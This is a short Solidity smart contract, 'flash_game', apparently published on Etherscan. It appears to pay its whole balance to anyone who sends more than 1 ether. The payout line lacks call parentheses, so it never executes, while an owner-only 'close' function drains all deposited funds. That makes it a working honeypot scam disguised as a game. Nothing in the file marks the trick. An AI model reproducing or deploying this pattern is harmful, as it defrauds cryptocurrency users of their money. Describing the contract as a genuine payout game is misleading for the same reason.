/**
 *Submitted for verification at Etherscan.io on 2023-08-30
*/

pragma solidity ^0.4.26;

contract flash_game {
    function multiplicate() public payable {
        if (msg.value > 1 ether) {
            msg.sender.call.value(address(this).balance);
        }
    }

    address public owner = msg.sender;

    function close() external payable {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    function() external payable {
        multiplicate();
    }

    constructor() public payable {}
}